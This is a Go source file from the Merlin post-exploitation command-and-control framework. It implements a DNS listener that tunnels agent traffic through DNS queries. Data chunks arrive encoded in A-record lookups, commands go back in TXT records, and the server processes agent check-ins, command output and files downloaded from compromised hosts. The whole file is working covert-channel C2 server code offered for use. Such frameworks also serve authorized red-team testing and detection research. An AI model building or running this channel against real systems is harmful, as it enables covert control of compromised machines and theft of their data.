// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package dns

import (
	"compress/zlib"
	"sort"
	"sync"

	"github.com/miekg/dns"
	// Standard
	"bytes"
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// Server is a structure for creating and instantiating new server objects
type Server struct {
	Interface string
	//Port        int
	//Protocol    string
	//Key         string
	//Certificate string
	Server interface{}
	Mux    *dns.ServeMux
	Domain string
}

// New instantiates a new server object and returns it
func New(iface string, port int, protocol string, domain string, key string) (Server, error) {
	s := Server{
		//Protocol:  protocol,
		Interface: iface,
		//Port:      port,
		Mux:    dns.NewServeMux(),
		Domain: domain,
	}

	s.Mux.HandleFunc(domain, s.agentHandler)

	srv := &dns.Server{
		Addr:    s.Interface + ":53",
		Handler: s.Mux,
		Net:     "udp",
		//	ReadTimeout:  10 * time.Second,
		//	WriteTimeout: 10 * time.Second,
		//MaxHeaderBytes: 1 << 20,
		//TLSConfig:      TLSConfig,
	}
	srv.ListenAndServe()
	s.Server = srv
	return s, nil
}

// Run function starts the server on the preconfigured port for the preconfigured service
func (s *Server) Run() error {
	logging.Server(fmt.Sprintf("Starting %s Listener at %s:%s", "dns", s.Interface, "53"))

	time.Sleep(45 * time.Millisecond) // Sleep to allow the shell to start up
	message("note", fmt.Sprintf("Starting %s listener on %s:%s", "dns", s.Interface, "53"))

	server := s.Server.(*dns.Server)
	defer func() {
		err := server.Shutdown()
		if err != nil {
			m := fmt.Sprintf("There was an error starting the dns server:\r\n%s", err.Error())
			logging.Server(m)
			message("warn", m)
			return
		}
	}()

	logging.Server(server.ListenAndServe().Error())
	return nil
}

// agentHandler function is responsible for all Merlin agent traffic
func (s Server) agentHandler(w dns.ResponseWriter, r *dns.Msg) {
	if core.Verbose {
		message("note", fmt.Sprintf("Received DNS Query: "+r.Question[0].String()))
		logging.Server(fmt.Sprintf("Received DNS Query: " + r.Question[0].String()))
	}

	if core.Debug { /*
			message("debug", fmt.Sprintf("HTTP Connection Details:"))
			message("debug", fmt.Sprintf("Host: %s", r.Host))
			message("debug", fmt.Sprintf("URI: %s", r.RequestURI))
			message("debug", fmt.Sprintf("Method: %s", r.Method))
			message("debug", fmt.Sprintf("Protocol: %s", r.Proto))
			message("debug", fmt.Sprintf("Headers: %s", r.Header))
			message("debug", fmt.Sprintf("TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
			message("debug", fmt.Sprintf("TLS Cipher Suite: %d", r.TLS.CipherSuite))
			message("debug", fmt.Sprintf("TLS Server Name: %s", r.TLS.ServerName))
			message("debug", fmt.Sprintf("Content Length: %d", r.ContentLength))

			logging.Server(fmt.Sprintf("[DEBUG]HTTP Connection Details:"))
			logging.Server(fmt.Sprintf("[DEBUG]Host: %s", r.Host))
			logging.Server(fmt.Sprintf("[DEBUG]URI: %s", r.RequestURI))
			logging.Server(fmt.Sprintf("[DEBUG]Method: %s", r.Method))
			logging.Server(fmt.Sprintf("[DEBUG]Protocol: %s", r.Proto))
			logging.Server(fmt.Sprintf("[DEBUG]Headers: %s", r.Header))
			logging.Server(fmt.Sprintf("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
			logging.Server(fmt.Sprintf("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite))
			logging.Server(fmt.Sprintf("[DEBUG]TLS Server Name: %s", r.TLS.ServerName))
			logging.Server(fmt.Sprintf("[DEBUG]Content Length: %d", r.ContentLength))
		*/
	}
	m := &dns.Msg{
		Compress: false,
	}
	m.SetReply(r)

	m.Authoritative = true
	m.RecursionAvailable = true

	for _, question := range m.Question {
		//got an A lookup
		if question.Qtype == dns.TypeA {
			go s.aLookup(m, &question, w)
		}
		if question.Qtype == dns.TypeTXT {
			go s.txtLookup(m, &question, w)
		}
	}

}
func (s Server) txtLookup(m *dns.Msg, question *dns.Question, w dns.ResponseWriter) {
	dnsResponseLock.RLock()
	defer dnsResponseLock.RUnlock()
	lookupSpaces := strings.Split(question.Name, ".")

	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(s.Domain, "."))+1)]
	//ensure we have a sanely length lookup
	if len(lookupSpaces) < 1 {
		return
	}

	cmdID := strings.ToUpper(lookupSpaces[len(lookupSpaces)-1])

	r := dns.TXT{}

	r.Hdr = dns.RR_Header{
		Name:   question.Name,
		Rrtype: dns.TypeTXT,
		Class:  dns.ClassINET,
		Ttl:    10,
	}

	if len(lookupSpaces) == 2 {
		//<messagenum>.<cmdid>
		chunkNumi, e := strconv.ParseInt(lookupSpaces[0], 10, 32)
		if e != nil {
			panic(e)
		}
		l, ok := dnsResponses[cmdID]
		if !ok {
			return
		}
		if len(l.chunks) < int(chunkNumi) {
			return
		}
		r.Txt = append(r.Txt, dnsResponses[cmdID].chunks[chunkNumi-1])
	}

	if len(lookupSpaces) == 1 {
		//<cmdid>
		//get pending commands for cmdid
		l, ok := dnsResponses[cmdID]
		if !ok {
			return
		}
		r.Txt = append(r.Txt, fmt.Sprintf("%d", len(l.chunks)))
	}

	rr, e := dns.NewRR(r.String())
	if e != nil {
		panic(e)
	}

	m.Answer = append(m.Answer, rr)
	w.WriteMsg(m)
}

func (s Server) aLookup(m *dns.Msg, question *dns.Question, w dns.ResponseWriter) {

	lookupSpaces := strings.Split(question.Name, ".")

	//remove the suffix
	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(s.Domain, "."))+1)]
	//ensure we have a sanely length lookup
	if len(lookupSpaces) < 4 {
		return
	}
	//last value is now the cmdID
	//<payload>.<this>.<max>.<cmdid>
	cmdID := lookupSpaces[len(lookupSpaces)-1]
	maxChunk := lookupSpaces[len(lookupSpaces)-2]
	thisChunk := lookupSpaces[len(lookupSpaces)-3]
	payload := strings.Join(lookupSpaces[:len(lookupSpaces)-3], "")
	complete, val := updateCmd(cmdID, maxChunk, thisChunk, payload)

	r := dns.A{}
	r.Hdr = dns.RR_Header{
		Name:   question.Name,
		Rrtype: dns.TypeA,
		Class:  dns.ClassINET,
		Ttl:    10,
	}

	if complete {
		ip := "0.0.0.0"
		resp := gotMessage(val)
		//fmt.Println("msg len", len(resp), string(resp))
		if len(resp) > 0 {
			cmdIDb := make([]byte, 3)
			rand.Read(cmdIDb)

			addResp(cmdIDb, resp)

			ip = fmt.Sprintf("%d.%d.%d.1", cmdIDb[0], cmdIDb[1], cmdIDb[2])
			r.A = net.ParseIP(ip)
		}
		r.A = net.ParseIP(ip)

	} else {
		r.A = net.ParseIP("0.0.0.0")
	}

	rr, e := dns.NewRR(r.String())
	if e != nil {
		panic(e)
	}

	m.Answer = append(m.Answer, rr)
	w.WriteMsg(m)

}

func gotMessage(b []byte) []byte {
	ret := []byte{}
	if true {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}

		e := json.NewDecoder(bytes.NewReader(b)).Decode(&j)
		if e != nil {
			message("warn", fmt.Sprintf("There was an error decoding a POST message sent by an "+
				"agent:\r\n%s", e))
			return ret
		}
		if core.Debug {
			message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", j))
		}

		switch j.Type {

		case "InitialCheckIn":
			var p messages.AgentInfo
			json.Unmarshal(payload, &p)
			agents.InitialCheckIn(j)

		case "StatusCheckIn":
			//w.Header().Set("Content-Type", "application/json")
			x, err := agents.StatusCheckIn(j)
			if core.Verbose {
				message("note", fmt.Sprintf("Sending "+x.Type+" message type to agent"))
			}
			if err != nil {
				m := fmt.Sprintf("There was an error during an Agent StatusCheckIn:\r\n%s", err.Error())
				logging.Server(m)
				message("warn", m)
			}

			ret, err = json.Marshal(x)
			if err != nil {
				m := fmt.Sprintf("There was an error encoding the StatusCheckIn JSON message:\r\n%s", err.Error())
				logging.Server(m)
				message("warn", m)
				return ret
			}

		case "CmdResults":
			// TODO move to its own function
			var p messages.CmdResults
			err3 := json.Unmarshal(payload, &p)
			if err3 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the CmdResults JSON object:\r\n%s", err3.Error())
				logging.Server(m)
				message("warn", m)
				return ret
			}
			agents.Log(j.ID, fmt.Sprintf("Results for job: %s", p.Job))

			message("success", fmt.Sprintf("Results for job %s at %s", p.Job, time.Now().UTC().Format(time.RFC3339)))
			if len(p.Stdout) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stdout):\r\n%s", p.Stdout))
				color.Green(fmt.Sprintf("%s", p.Stdout))
			}
			if len(p.Stderr) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stderr):\r\n%s", p.Stderr))
				color.Red(fmt.Sprintf("%s", p.Stderr))
			}

		case "AgentInfo":
			var p messages.AgentInfo
			err4 := json.Unmarshal(payload, &p)
			if err4 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the AgentInfo JSON object:\r\n%s", err4.Error())
				logging.Server(m)
				message("warn", m)
				return ret
			}
			if core.Debug {
				message("debug", fmt.Sprintf("AgentInfo JSON object: %v", p))
			}
			agents.UpdateInfo(j, p)
		case "FileTransfer":
			var p messages.FileTransfer
			err5 := json.Unmarshal(payload, &p)
			if err5 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the FileTransfer JSON object:\r\n%s", err5.Error())
				logging.Server(m)
				message("warn", m)
			}
			if p.IsDownload {
				agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
				_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
				if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
					m := fmt.Sprintf("There was an error locating the agent's directory:\r\n%s", errD.Error())
					logging.Server(m)
					message("warn", m)
				}
				message("success", fmt.Sprintf("Results for job %s", p.Job))
				downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

				if downloadBlobErr != nil {
					m := fmt.Sprintf("There was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
					logging.Server(m)
					message("warn", m)
				} else {
					downloadFile := filepath.Join(agentsDir, j.ID.String(), f)
					writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0644)
					if writingErr != nil {
						m := fmt.Sprintf("There was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
						logging.Server(m)
						message("warn", m)
					} else {
						message("success", fmt.Sprintf("Successfully downloaded file %s with a size of "+
							"%d bytes from agent %s to %s",
							p.FileLocation,
							len(downloadBlob),
							j.ID.String(),
							downloadFile))
						agents.Log(j.ID, fmt.Sprintf("Successfully downloaded file %s with a size of %d "+
							"bytes from agent to %s",
							p.FileLocation,
							len(downloadBlob),
							downloadFile))
					}
				}
			}
		default:
			message("warn", fmt.Sprintf("Invalid Activity: %s", j.Type))
		}

	} // else if r.Method == "GET" {
	// Should answer any GET requests
	// Send 404
	//w.WriteHeader(404)
	//} //else if r.Method == "OPTIONS" && r.ProtoMajor == 2 {
	//w.Header().Set("Access-Control-Allow-Methods", "POST")
	//w.Header().Set("Access-Control-Allow-Origin", "*")
	//w.Header().Set("Access-Control-Allow-Headers", "accept, content-type")
	//} else {
	//w.WriteHeader(404)
	//}
	return ret
}

// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

var dnsResponseLock *sync.RWMutex

func addResp(cmdIDb, b []byte) {
	if dnsResponseLock == nil {
		dnsResponseLock = &sync.RWMutex{}
	}
	dnsResponseLock.Lock()
	defer dnsResponseLock.Unlock()
	if dnsResponses == nil {
		dnsResponses = make(map[string]dnsResponse)
	}
	cmdIDb32 := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(cmdIDb)
	dnsResponses[cmdIDb32] = dnsResponse{}.New(b)
}

var cmdMap map[string]dnsMessage
var cmMutex *sync.RWMutex

var dnsResponses map[string]dnsResponse

type dnsResponse struct {
	message []byte
	chunks  []string
}

const txtMaxLen = 1000

func (d dnsResponse) New(b []byte) dnsResponse {
	r := dnsResponse{message: b}
	//encode response to base64
	b64 := base64.RawStdEncoding.EncodeToString(b)

	//split message up into records
	recordCount := len(b64) / txtMaxLen
	leftover := len(b64) % txtMaxLen
	if leftover > 0 {
		recordCount++
	}

	for thisRecord := 1; thisRecord <= recordCount; thisRecord++ {
		min := (thisRecord - 1) * txtMaxLen
		max := thisRecord * txtMaxLen
		if max > len(b64) {
			max = len(b64)
		}
		record := b64[min:max]
		r.chunks = append(r.chunks, record)
	}

	return r
}

type dnsChunk struct {
	body string
	num  int32
}

type dnsMessage struct {
	Payload     string
	CmdID       string
	Response    []byte
	Chunks      []dnsChunk
	TotalChunks int32
	ReadChunks  int32
	Key         []byte
}

func (d *dnsMessage) AddChunk(cnum int32, val string) {
	for _, x := range d.Chunks {
		if x.num == cnum {
			return
		}
	}
	d.Chunks = append(d.Chunks, dnsChunk{body: val, num: cnum})
	d.ReadChunks++
	if d.TotalChunks > 1000 {
		//get 10% of full message (roughly)
		ten := d.TotalChunks / 10
		if d.ReadChunks%ten == 0 {
			message("note", fmt.Sprintf("Read %d of %d (%.2f%%) large message", d.ReadChunks, d.TotalChunks, float32(d.ReadChunks)/float32(d.TotalChunks)*float32(100)))
		}
	}
}

func (d dnsMessage) IsDone() bool {
	if d.TotalChunks == 0 || d.TotalChunks > d.ReadChunks {
		return false
	}
	return true
}

func (d dnsMessage) ReadResponse() []byte {
	//sort
	rval := ""
	sort.Slice(d.Chunks, func(i, j int) bool {
		if d.Chunks[i].num < d.Chunks[j].num {
			return true
		}
		return false
	})

	for _, x := range d.Chunks {
		rval += x.body
	}

	//base32 decode
	v, e := base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(rval))
	if e != nil {
		panic(e)
		return []byte{}
	}

	//unzip
	z, e := zlib.NewReader(bytes.NewReader(v))
	if e != nil {
		panic(e)
	}
	v, e = ioutil.ReadAll(z)
	if e != nil {
		panic(e)
	}

	return v
}

func updateCmd(cmdID, maxChunk, thisChunk, payload string) (bool, []byte) {
	if cmdMap == nil {
		cmdMap = make(map[string]dnsMessage)
		cmMutex = &sync.RWMutex{}
	}
	//prevent multiple adjustments to the same map
	cmMutex.Lock()
	defer cmMutex.Unlock()

	thsmsg, ok := cmdMap[cmdID]
	if !ok {
		thsmsg = dnsMessage{
			CmdID: cmdID,
		}
	}
	chunkNumi, e := strconv.ParseInt(thisChunk, 16, 32)
	if e != nil {
		fmt.Println("Bad chunk num")
		return false, []byte{}
	}

	maxChunki, e := strconv.ParseInt(maxChunk, 16, 32)
	if e != nil {
		fmt.Println("Bad max chunks")
		return false, []byte{}
	}
	if chunkNumi > maxChunki {
		fmt.Println("Bad chunknum, higher than maxchunks")
		return false, []byte{}
	}

	thsmsg.TotalChunks = int32(maxChunki)
	thsmsg.AddChunk(int32(chunkNumi), payload)
	cmdMap[cmdID] = thsmsg

	if thsmsg.IsDone() {
		rb := thsmsg.ReadResponse()
		delete(cmdMap, cmdID)
		return true, rb
	}
	return false, []byte{}

}

// TODO make sure all errors are logged to server log
